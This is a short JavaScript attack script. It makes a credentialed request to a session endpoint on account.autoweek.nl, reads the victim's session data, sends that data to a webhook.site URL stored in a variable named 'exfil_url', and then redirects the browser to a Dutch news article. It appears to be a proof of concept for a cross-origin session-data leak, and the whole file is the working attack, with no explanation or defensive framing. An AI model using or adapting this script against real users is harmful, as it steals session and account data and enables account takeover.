const api_url = 'https://account.autoweek.nl/ooasv2/sessions'; 
const exfil_url = 'https://webhook.site/0b5b65f9-4d4f-4adb-88b1-ca023d4e9861?data='
const redirect_url = 'https://www.volkskrant.nl/binnenland/wilders-geeft-noodwet-alsnog-op-strenge-asielmaatregelen-eerst-langs-parlement~bf84ea55/';

async function exfil() {
  const response = await fetch(api_url, { credentials: 'include'});
  const data = await response.json(); 
  const dataString = JSON.stringify(data); 
  await fetch(exfil_url, { mode: 'no-cors', method: 'POST', headers: {'Content-Type': 'application/json'}, body: dataString });
  window.location.href = redirect_url;
}

exfil();
